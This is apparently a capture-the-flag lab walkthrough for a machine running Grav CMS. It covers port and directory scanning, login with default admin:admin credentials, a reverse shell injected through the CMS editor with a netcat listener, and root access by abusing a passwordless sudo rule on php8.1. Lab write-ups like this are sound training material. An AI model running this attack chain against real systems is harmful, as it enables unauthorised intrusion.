# 🐧 Astronaut

> Grav CMS / sudo php8.1

### Enumerating Services
First, we'll perform a generic scan to identify the open ports and services running on this machine.
```shell
# TCP
sudo nmap -sCV -p- --min-rate=10000 -Pn 192.168.182.31

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Enumerating port 80
Found Grav CMS admin panel. Default credentials admin:admin worked.
```shell
# Enum dir
feroxbuster -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -d 1 -x php,html,txt -C 404,502 -u http://192.168.182.31

http://192.168.182.31/admin
```
### Initial Access
Grav CMS allows PHP code execution via the admin panel editor.
```shell
# Login to /admin with admin:admin
# Navigate to Tools > Scheduler or Page editor
# Inject PHP reverse shell

# Listener
rlwrap -cAra nc -vnlp 443

# TTY Upgrade
/usr/bin/python3 -c "import pty;pty.spawn('/bin/bash')"

# Evidence
cat /home/alex/local.txt
```
### Privilege Escalation
```shell
# Sudo check
sudo -l
User www-data may run the following commands:
    (ALL) NOPASSWD: /usr/bin/php8.1

# Privilege Escalation via GTFOBins
sudo /usr/bin/php8.1 -r "system('/bin/bash');"
```
### Post-Exploitation
```shell
# Evidence
cat /root/proof.txt
```
